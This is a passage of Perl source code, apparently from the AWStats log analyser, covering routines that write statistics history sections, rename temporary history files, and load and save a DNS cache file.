                . int( $_url_x{$_} || 0 )
                . "${xmlre}\n";
        }
        foreach ( keys %_url_p ) {
            if ( $keysinkeylist{$_} ) { next; }
            my $newkey = $_;
            $newkey =~ s/([^:])\/\//$1\//g
            ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($newkey)
                . "${xmlrs}"
                . int( $_url_p{$_} || 0 )
                . "${xmlrs}"
                . int( $_url_k{$_} || 0 )
                . "${xmlrs}"
                . int( $_url_e{$_} || 0 )
                . "${xmlrs}"
                . int( $_url_x{$_} || 0 )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_SIDER${xmlee}\n";
    }
    if ( $sectiontosave eq 'filetypes' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP
            "# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_FILETYPES${xmlbs}"
            . ( scalar keys %_filetypes_h )
            . "${xmlbe}\n";
        foreach ( keys %_filetypes_h ) {
            my $hits        = $_filetypes_h{$_}      || 0;
            my $bytes       = $_filetypes_k{$_}      || 0;
            my $bytesbefore = $_filetypes_gz_in{$_}  || 0;
            my $bytesafter  = $_filetypes_gz_out{$_} || 0;
            print HISTORYTMP
                "${xmlrb}$_${xmlrs}$hits${xmlrs}$bytes${xmlrs}$bytesbefore${xmlrs}$bytesafter${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_FILETYPES${xmlee}\n";
    }
    if ( $sectiontosave eq 'downloads' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Downloads - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_DOWNLOADS${xmlbs}"
            . ( scalar keys %_downloads )
            . "${xmlbe}\n";
        for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($u)
                . "${xmlrs}"
                . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_HITS'} || 0)
                . "${xmlrs}"
                . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_206'} || 0)
                ."${xmlrs}"
                . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_SIZE'} || 0)
                ."${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_DOWNLOADS${xmlee}\n";
    }
    if ( $sectiontosave eq 'os' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# OS ID - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_OS ID - Hits - Pages${xmlbs}"
            . ( scalar keys %_os_h )
            . "${xmlbe}\n";
        foreach ( keys %_os_h ) {
            my $hits        = $_os_h{$_}      || 0;
            my $pages       = $_os_p{$_}      || 0;
            print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_OS${xmlee}\n";
    }
    if ( $sectiontosave eq 'browser' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Browser ID - Hits - Pages\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_BROWSER${xmlbs}"
            . ( scalar keys %_browser_h )
            . "${xmlbe}\n";
        foreach ( keys %_browser_h ) {
            my $hits        = $_browser_h{$_}      || 0;
            my $pages       = $_browser_p{$_}      || 0;
            print HISTORYTMP "${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_BROWSER${xmlee}\n";
    }
    if ( $sectiontosave eq 'screensize' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Screen size - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_SCREENSIZE${xmlbs}"
            . ( scalar keys %_screensize_h )
            . "${xmlbe}\n";
        foreach ( keys %_screensize_h ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}$_screensize_h{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_SCREENSIZE${xmlee}\n";
    }

    # Referer
    if ( $sectiontosave eq 'unknownreferer' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Unknown referer OS - Last visit date\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_UNKNOWNREFERER${xmlbs}"
            . ( scalar keys %_unknownreferer_l )
            . "${xmlbe}\n";
        foreach ( keys %_unknownreferer_l ) {
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($_)
                . "${xmlrs}$_unknownreferer_l{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_UNKNOWNREFERER${xmlee}\n";
    }
    if ( $sectiontosave eq 'unknownrefererbrowser' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Unknown referer Browser - Last visit date\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_UNKNOWNREFERERBROWSER${xmlbs}"
            . ( scalar keys %_unknownrefererbrowser_l )
            . "${xmlbe}\n";
        foreach ( keys %_unknownrefererbrowser_l ) {
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($_)
                . "${xmlrs}$_unknownrefererbrowser_l{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_UNKNOWNREFERERBROWSER${xmlee}\n";
    }
    if ( $sectiontosave eq 'origin' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Origin - Pages - Hits \n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_ORIGIN${xmlbs}6" . "${xmlbe}\n";
        print HISTORYTMP "${xmlrb}From0${xmlrs}"
            . int( $_from_p[0] )
            . "${xmlrs}"
            . int( $_from_h[0] )
            . "${xmlre}\n";
        print HISTORYTMP "${xmlrb}From1${xmlrs}"
            . int( $_from_p[1] )
            . "${xmlrs}"
            . int( $_from_h[1] )
            . "${xmlre}\n";
        print HISTORYTMP "${xmlrb}From2${xmlrs}"
            . int( $_from_p[2] )
            . "${xmlrs}"
            . int( $_from_h[2] )
            . "${xmlre}\n";
        print HISTORYTMP "${xmlrb}From3${xmlrs}"
            . int( $_from_p[3] )
            . "${xmlrs}"
            . int( $_from_h[3] )
            . "${xmlre}\n";
        print HISTORYTMP "${xmlrb}From4${xmlrs}"
            . int( $_from_p[4] )
            . "${xmlrs}"
            . int( $_from_h[4] )
            . "${xmlre}\n";    # Same site
        print HISTORYTMP "${xmlrb}From5${xmlrs}"
            . int( $_from_p[5] )
            . "${xmlrs}"
            . int( $_from_h[5] )
            . "${xmlre}\n";    # News
        print HISTORYTMP "${xmleb}END_ORIGIN${xmlee}\n";
    }
    if ( $sectiontosave eq 'sereferrals' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Search engine referers ID - Pages - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_SEREFERRALS${xmlbs}"
            . ( scalar keys %_se_referrals_h )
            . "${xmlbe}\n";
        foreach ( keys %_se_referrals_h ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_se_referrals_p{$_} || 0 )
                . "${xmlrs}$_se_referrals_h{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_SEREFERRALS${xmlee}\n";
    }
    if ( $sectiontosave eq 'pagerefs' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'RefererShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# External page referers - Pages - Hits\n";
        print HISTORYTMP
            "# The $MaxNbOf{'RefererShown'} first Pages must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_PAGEREFS${xmlbs}"
            . ( scalar keys %_pagesrefs_h )
            . "${xmlbe}\n";

        # We save page list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList(
            $MaxNbOf{'RefererShown'}, $MinHit{'Refer'},
            \%_pagesrefs_h,           \%_pagesrefs_p
        );
        %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            my $newkey = $_;
            $newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i
            ; # Remove / at end of http://.../ but not at end of http://.../dir/
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($newkey)
                . "${xmlrs}"
                . int( $_pagesrefs_p{$_} || 0 )
                . "${xmlrs}$_pagesrefs_h{$_}${xmlre}\n";
        }
        foreach ( keys %_pagesrefs_h ) {
            if ( $keysinkeylist{$_} ) { next; }
            my $newkey = $_;
            $newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i
            ; # Remove / at end of http://.../ but not at end of http://.../dir/
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($newkey)
                . "${xmlrs}"
                . int( $_pagesrefs_p{$_} || 0 )
                . "${xmlrs}$_pagesrefs_h{$_}${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_PAGEREFS${xmlee}\n";
    }
    if ( $sectiontosave eq 'searchwords' ) {

        # Save phrases section
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='$sectiontosave'><sortfor>$MaxNbOf{'KeyphrasesShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# Search keyphrases - Number of search\n";
        print HISTORYTMP
            "# The $MaxNbOf{'KeyphrasesShown'} first number of search must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_SEARCHWORDS${xmlbs}"
            . ( scalar keys %_keyphrases )
            . "${xmlbe}\n";

        # We will also build _keywords
        %_keywords = ();

        # We save key list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'KeywordsShown'},
            $MinHit{'Keyword'}, \%_keyphrases, \%_keyphrases );
        %keysinkeylist = ();
        foreach my $key (@keylist) {
            $keysinkeylist{$key} = 1;
            my $keyphrase = $key;
            $keyphrase =~ tr/ /\+/s;
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($keyphrase)
                . "${xmlrs}"
                . $_keyphrases{$key}
                . "${xmlre}\n";
            foreach ( split( /\+/, $key ) ) {
                $_keywords{$_} += $_keyphrases{$key};
            }    # To init %_keywords
        }
        foreach my $key ( keys %_keyphrases ) {
            if ( $keysinkeylist{$key} ) { next; }
            my $keyphrase = $key;
            $keyphrase =~ tr/ /\+/s;
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($keyphrase)
                . "${xmlrs}"
                . $_keyphrases{$key}
                . "${xmlre}\n";
            foreach ( split( /\+/, $key ) ) {
                $_keywords{$_} += $_keyphrases{$key};
            }    # To init %_keywords
        }
        print HISTORYTMP "${xmleb}END_SEARCHWORDS${xmlee}\n";

        # Now save keywords section
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP
                "<section id='keywords'><sortfor>$MaxNbOf{'KeywordsShown'}</sortfor><comment>\n";
        }
        print HISTORYTMP "# Search keywords - Number of search\n";
        print HISTORYTMP
            "# The $MaxNbOf{'KeywordsShown'} first number of search must be first (order not required for others)\n";
        $ValueInFile{"keywords"} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_KEYWORDS${xmlbs}"
            . ( scalar keys %_keywords )
            . "${xmlbe}\n";

        # We save key list in score sorted order to get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'KeywordsShown'},
            $MinHit{'Keyword'}, \%_keywords, \%_keywords );
        %keysinkeylist = ();
        foreach (@keylist) {
            $keysinkeylist{$_} = 1;
            my $keyword = $_;
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($keyword)
                . "${xmlrs}"
                . $_keywords{$_}
                . "${xmlre}\n";
        }
        foreach ( keys %_keywords ) {
            if ( $keysinkeylist{$_} ) { next; }
            my $keyword = $_;
            print HISTORYTMP "${xmlrb}"
                . XMLEncodeForHisto($keyword)
                . "${xmlrs}"
                . $_keywords{$_}
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_KEYWORDS${xmlee}\n";

    }

    # Other - Errors
    if ( $sectiontosave eq 'cluster' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Cluster ID - Pages - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_CLUSTER${xmlbs}"
            . ( scalar keys %_cluster_h )
            . "${xmlbe}\n";
        foreach ( keys %_cluster_h ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_cluster_p{$_} || 0 )
                . "${xmlrs}"
                . int( $_cluster_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_cluster_k{$_} || 0 )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_CLUSTER${xmlee}\n";
    }
    if ( $sectiontosave eq 'misc' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Misc ID - Pages - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_MISC${xmlbs}"
            . ( scalar keys %MiscListCalc )
            . "${xmlbe}\n";
        foreach ( keys %MiscListCalc ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}"
                . int( $_misc_p{$_} || 0 )
                . "${xmlrs}"
                . int( $_misc_h{$_} || 0 )
                . "${xmlrs}"
                . int( $_misc_k{$_} || 0 )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_MISC${xmlee}\n";
    }
    if ( $sectiontosave eq 'errors' ) {
        print HISTORYTMP "\n";
        if ($xml) {
            print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
        }
        print HISTORYTMP "# Errors - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "${xmlbb}BEGIN_ERRORS${xmlbs}"
            . ( scalar keys %_errors_h )
            . "${xmlbe}\n";
        foreach ( keys %_errors_h ) {
            print HISTORYTMP "${xmlrb}$_${xmlrs}$_errors_h{$_}${xmlrs}"
                . int( $_errors_k{$_} || 0 )
                . "${xmlre}\n";
        }
        print HISTORYTMP "${xmleb}END_ERRORS${xmlee}\n";
    }

    # Other - Trapped errors
    foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
        if ( $sectiontosave eq "sider_$code" ) {
            print HISTORYTMP "\n";
            if ($xml) {
                print HISTORYTMP "<section id='$sectiontosave'><comment>\n";
            }
            print HISTORYTMP
                "# URL with $code errors - Hits"
                    . ($ShowHTTPErrorsPageDetail =~ /R/i ? " - Last URL referrer" : '')
                    . ($ShowHTTPErrorsPageDetail =~ /H/i ? " - Host" : '')
                    . "\n";

            $ValueInFile{$sectiontosave} = tell HISTORYTMP;
            print HISTORYTMP "${xmlbb}BEGIN_SIDER_$code${xmlbs}"
                . ( scalar keys %{$_sider_h{$code}} )
                . "${xmlbe}\n";
            foreach ( keys %{$_sider_h{$code}} ) {
                my $newkey = $_;
                my $newreferer = $_referer_h{$code}{$_} || '';
                my $newhost = $_err_host_h{$code}{$_} || '';
                print HISTORYTMP "${xmlrb}"
                    . XMLEncodeForHisto($newkey)
                    . "${xmlrs}$_sider_h{ $code }{$_}"
                    . ($ShowHTTPErrorsPageDetail =~ /R/i ? "${xmlrs}" . XMLEncodeForHisto($newreferer) : '')
                    . ($ShowHTTPErrorsPageDetail =~ /H/i ? "${xmlrs}" . XMLEncodeForHisto($newhost) : '')
                    . "${xmlre}\n";
            }
            print HISTORYTMP "${xmleb}END_SIDER_$code${xmlee}\n";
        }
    }

    # Other - Extra stats sections
    foreach my $extranum ( 1 .. @ExtraName - 1 ) {
        if ( $sectiontosave eq "extra_$extranum" ) {
            print HISTORYTMP "\n";
            if ($xml) {
                print HISTORYTMP
                    "<section id='$sectiontosave'><sortfor>$MaxNbOfExtra[$extranum]</sortfor><comment>\n";
            }
            print HISTORYTMP
                "# Extra key - Pages - Hits - Bandwidth - Last access\n";
            print HISTORYTMP
                "# The $MaxNbOfExtra[$extranum] first number of hits are first\n";
            $ValueInFile{$sectiontosave} = tell HISTORYTMP;
            print HISTORYTMP "${xmlbb}BEGIN_EXTRA_$extranum${xmlbs}"
                . scalar( keys %{ '_section_' . $extranum . '_h' } )
                . "${xmlbe}\n";
            &BuildKeyList(
                $MaxNbOfExtra[$extranum],
                $MinHitExtra[$extranum],
                \%{ '_section_' . $extranum . '_h' },
                \%{ '_section_' . $extranum . '_p' }
            );
            %keysinkeylist = ();
            foreach (@keylist) {
                $keysinkeylist{$_} = 1;
                my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
                my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
                my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
                print HISTORYTMP "${xmlrb}"
                    . XMLEncodeForHisto($_)
                    . "${xmlrs}$page${xmlrs}",
                    ${ '_section_' . $extranum . '_h' }{$_},
                    "${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\n";
                next;
            }
            foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
                if ( $keysinkeylist{$_} ) { next; }
                my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
                my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
                my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
                print HISTORYTMP "${xmlrb}"
                    . XMLEncodeForHisto($_)
                    . "${xmlrs}$page${xmlrs}",
                    ${ '_section_' . $extranum . '_h' }{$_},
                    "${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\n";
                next;
            }
            print HISTORYTMP "${xmleb}END_EXTRA_$extranum${xmlee}\n";
        }
    }

    # Other - Plugin sections
    if ( $AtLeastOneSectionPlugin && $sectiontosave =~ /^plugin_(\w+)$/i ) {
        my $pluginname = $1;
        if ( $PluginsLoaded{'SectionInitHashArray'}{"$pluginname"} ) {

            #   		my $function="SectionWriteHistory_$pluginname(\$xml,\$xmlbb,\$xmlbs,\$xmlbe,\$xmlrb,\$xmlrs,\$xmlre,\$xmleb,\$xmlee)";
            #  		    eval("$function");
            my $function = "SectionWriteHistory_$pluginname";
            &$function(
                $xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,
                $xmlrs, $xmlre, $xmleb, $xmlee
            );
        }
    }

    %keysinkeylist = ();
}

#--------------------------------------------------------------------
# Function:     Rename all tmp history file into history
# Parameters:   None
# Input:        $DirData $PROG $FileSuffix
#               $KeepBackupOfHistoricFile $SaveDatabaseFilesWithPermissionsForEveryone
# Output:       None
# Return:       1 Ok, 0 at least one error (tmp files are removed)
#--------------------------------------------------------------------
sub Rename_All_Tmp_History {
    my $pid      = $$;
    my $renameok = 1;

    if ($Debug) {
        debug("Call to Rename_All_Tmp_History (FileSuffix=$FileSuffix)");
    }

    opendir( DIR, "$DirData" );

    my $datemask;
    if    ( $DatabaseBreak eq 'month' ) { $datemask = '\d\d\d\d\d\d'; }
    elsif ( $DatabaseBreak eq 'year' )  { $datemask = '\d\d\d\d'; }
    elsif ( $DatabaseBreak eq 'day' )   { $datemask = '\d\d\d\d\d\d\d\d'; }
    elsif ( $DatabaseBreak eq 'hour' )  { $datemask = '\d\d\d\d\d\d\d\d\d\d'; }
    if ($Debug) {
        debug(
            "Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'"
        );
    }

    my $regfilesuffix = quotemeta($FileSuffix);
    foreach ( grep /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/,
        file_filt sort readdir DIR )
    {
        /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/;
        if ($renameok) {    # No rename error yet
            if ($Debug) {
                debug(
                    " Rename new tmp history file $PROG$1$FileSuffix.tmp.$$ into $PROG$1$FileSuffix.txt",
                    1
                );
            }
            if ( -s "$DirData/$PROG$1$FileSuffix.tmp.$$" )
            {               # Rename tmp files if size > 0
                if ($KeepBackupOfHistoricFiles) {
                    if ( -s "$DirData/$PROG$1$FileSuffix.txt" )
                    {       # History file already exists. We backup it
                        if ($Debug) {
                            debug(
                                "  Make a backup of old history file into $PROG$1$FileSuffix.bak before",
                                1
                            );
                        }

                        #if (FileCopy("$DirData/$PROG$1$FileSuffix.txt","$DirData/$PROG$1$FileSuffix.bak")) {
                        if (
                            rename(
                                "$DirData/$PROG$1$FileSuffix.txt",
                                "$DirData/$PROG$1$FileSuffix.bak"
                            ) == 0
                        )
                        {
                            warning(
                                "Warning: Failed to make a backup of \"$DirData/$PROG$1$FileSuffix.txt\" into \"$DirData/$PROG$1$FileSuffix.bak\"."
                            );
                        }
                        if ($SaveDatabaseFilesWithPermissionsForEveryone) {
                            chmod 0666, "$DirData/$PROG$1$FileSuffix.bak";
                        }
                    }
                    else {
                        if ($Debug) {
                            debug( "  No need to backup old history file", 1 );
                        }
                    }
                }
                if (
                    rename(
                        "$DirData/$PROG$1$FileSuffix.tmp.$$",
                        "$DirData/$PROG$1$FileSuffix.txt"
                    ) == 0
                )
                {
                    $renameok =
                        0;    # At least one error in renaming working files
                    # Remove tmp file
                    unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
                    warning(
                        "Warning: Failed to rename \"$DirData/$PROG$1$FileSuffix.tmp.$$\" into \"$DirData/$PROG$1$FileSuffix.txt\".\nWrite permissions on \"$PROG$1$FileSuffix.txt\" might be wrong"
                            . (
                            $ENV{'GATEWAY_INTERFACE'}
                                ? " for an 'update from web'"
                                : ""
                        )
                            . " or file might be opened."
                    );
                    next;
                }
                if ($SaveDatabaseFilesWithPermissionsForEveryone) {
                    chmod 0666, "$DirData/$PROG$1$FileSuffix.txt";
                }
            }
        }
        else {    # Because of rename error, we remove all remaining tmp files
            unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
        }
    }
    close DIR;
    return $renameok;
}

#------------------------------------------------------------------------------
# Function:     Load DNS cache file entries into a memory hash array
# Parameters:	Hash array ref to load into,
#               File name to load,
#				File suffix to use
#               Save to a second plugin file if not up to date
# Input:		None
# Output:		Hash array is loaded
# Return:		1 No DNS Cache file found, 0 OK
#------------------------------------------------------------------------------
sub Read_DNS_Cache {
    my $hashtoload   = shift;
    my $dnscachefile = shift;
    my $filesuffix   = shift;
    my $savetohash   = shift;

    my $dnscacheext = '';
    my $filetoload  = '';
    my $timetoload  = time();

    if ($Debug) { debug("Call to Read_DNS_Cache [file=\"$dnscachefile\"]"); }
    if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
    foreach my $dir ( "$DirData", ".", "" ) {
        my $searchdir = $dir;
        if (   $searchdir
            && ( !( $searchdir =~ /\/$/ ) )
            && ( !( $searchdir =~ /\\$/ ) ) )
        {
            $searchdir .= "/";
        }
        if ( -f "${searchdir}$dnscachefile$filesuffix$dnscacheext" ) {
            $filetoload = "${searchdir}$dnscachefile$filesuffix$dnscacheext";
        }

        # Plugin call : Change filetoload
        if ( $PluginsLoaded{'SearchFile'}{'hashfiles'} ) {
            SearchFile_hashfiles(
                $searchdir,   $dnscachefile, $filesuffix,
                $dnscacheext, $filetoload
            );
        }
        if ($filetoload) { last; }    # We found a file to load
    }

    if ( !$filetoload ) {
        if ($Debug) { debug(" No DNS Cache file found"); }
        return 1;
    }

    # Plugin call : Load hashtoload
    if ( $PluginsLoaded{'LoadCache'}{'hashfiles'} ) {
        LoadCache_hashfiles( $filetoload, $hashtoload );
    }
    if ( !scalar keys %$hashtoload ) {
        open( DNSFILE, "$filetoload" )
            or error("Couldn't open DNS Cache file \"$filetoload\": $!");

        #binmode DNSFILE;		# If we set binmode here, it seems that the load is broken on ActiveState 5.8
        # This is a fast way to load with regexp
        %$hashtoload =
            map( /^(?:\d{0,10}\s+)?([0-9A-F:\.]+)\s+([^\s]+)$/oi, <DNSFILE> );
        close DNSFILE;
        if ($savetohash) {

            # Plugin call : Save hash file (all records) with test if up to date to save
            if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
                SaveHash_hashfiles( $filetoload, $hashtoload, 1, 0 );
            }
        }
    }
    if ($Debug) {
        debug(
            " Loaded "
                . ( scalar keys %$hashtoload )
                . " items from $filetoload in "
                . ( time() - $timetoload )
                . " seconds.",
            1
        );
    }
    return 0;
}

#------------------------------------------------------------------------------
# Function:     Save a memory hash array into a DNS cache file
# Parameters:	Hash array ref to save,
#               File name to save,
#				File suffix to use
# Input:		None
# Output:		None
# Return:		0 OK, 1 Error
#------------------------------------------------------------------------------
sub Save_DNS_Cache_File {
    my $hashtosave   = shift;
    my $dnscachefile = shift;
    my $filesuffix   = shift;

    my $dnscacheext    = '';
    my $filetosave     = '';
    my $timetosave     = time();
    my $nbofelemtosave = $NBOFLASTUPDATELOOKUPTOSAVE;
    my $nbofelemsaved  = 0;

    if ($Debug) {
        debug("Call to Save_DNS_Cache_File [file=\"$dnscachefile\"]");
    }
    if ( !scalar keys %$hashtosave ) {
        if ($Debug) { debug(" No data to save"); }
        return 0;
    }
    if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
    $filetosave = "$dnscachefile$filesuffix$dnscacheext";

    # Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date
    if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
        SaveHash_hashfiles( $filetosave, $hashtosave, 0, $nbofelemtosave,
            $nbofelemsaved );
        if ($SaveDatabaseFilesWithPermissionsForEveryone) {
            chmod 0666, "$filetosave";
        }
    }
    if ( !$nbofelemsaved ) {
        $filetosave = "$dnscachefile$filesuffix$dnscacheext";
        if ($Debug) {
            debug(
                " Save data "
                    . (
                    $nbofelemtosave
                        ? "($nbofelemtosave records max)"
                        : "(all records)"
                )
                    . " into file $filetosave"
            );
        }
        if ( !open( DNSFILE, ">$filetosave" ) ) {
            warning(
                "Warning: Failed to open for writing last update DNS Cache file \"$filetosave\": $!"
            );
            return 1;
        }
        binmode DNSFILE;
        my $starttimemin = int( $starttime / 60 );
        foreach my $key ( keys %$hashtosave ) {

            #if ($hashtosave->{$key} ne '*') {
            my $ipsolved = $hashtosave->{$key};
            print DNSFILE "$starttimemin\t$key\t"
                . ( $ipsolved eq 'ip' ? '*' : $ipsolved )
                . "\n";    # Change 'ip' to '*' for backward compatibility
            if ( ++$nbofelemsaved >= $NBOFLASTUPDATELOOKUPTOSAVE ) { last; }

            #}
        }
        close DNSFILE;

        if ($SaveDatabaseFilesWithPermissionsForEveryone) {
            chmod 0666, "$filetosave";
        }

    }
    if ($Debug) {
        debug(
            " Saved $nbofelemsaved items into $filetosave in "
                . ( time() - $timetosave )
                . " seconds.",
            1
        );
    }
    return 0;
}

#------------------------------------------------------------------------------
# Function:     Return time elapsed since last call in miliseconds
# Parameters:	0|1 (0 reset counter, 1 no reset)
# Input:		None
# Output:		None
# Return:		Number of miliseconds elapsed since last call
#------------------------------------------------------------------------------
sub GetDelaySinceStart {
    if (shift) { $StartSeconds = 0; }    # Reset chrono
    my ( $newseconds, $newmicroseconds ) = ( time(), 0 );

    # Plugin call : Return seconds and milliseconds
    if ( $PluginsLoaded{'GetTime'}{'timehires'} ) {
        GetTime_timehires( $newseconds, $newmicroseconds );
    }
    if ( !$StartSeconds ) {
        $StartSeconds      = $newseconds;
        $StartMicroseconds = $newmicroseconds;
    }
    return ( ( $newseconds - $StartSeconds ) * 1000 +
        int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );
}

#------------------------------------------------------------------------------
# Function:     Reset all variables whose name start with _ because a new month start
# Parameters:	None
# Input:        $YearRequired All variables whose name start with _
# Output:       All variables whose name start with _
# Return:		None
#------------------------------------------------------------------------------
sub Init_HashArray {
    if ($Debug) { debug("Call to Init_HashArray"); }

    # Reset global hash arrays
    %FirstTime           = %LastTime           = ();
    %MonthHostsKnown     = %MonthHostsUnknown  = ();
    %MonthVisits         = %MonthUnique        = ();
    %MonthPages          = %MonthHits          = %MonthBytes = ();
    %MonthNotViewedPages = %MonthNotViewedHits = %MonthNotViewedBytes = ();
    %DayPages            = %DayHits            = %DayBytes = %DayVisits = ();

    # Reset all arrays with name beginning by _
    for ( my $ix = 0 ; $ix < 6 ; $ix++ ) {
        $_from_p[$ix] = 0;
        $_from_h[$ix] = 0;
    }
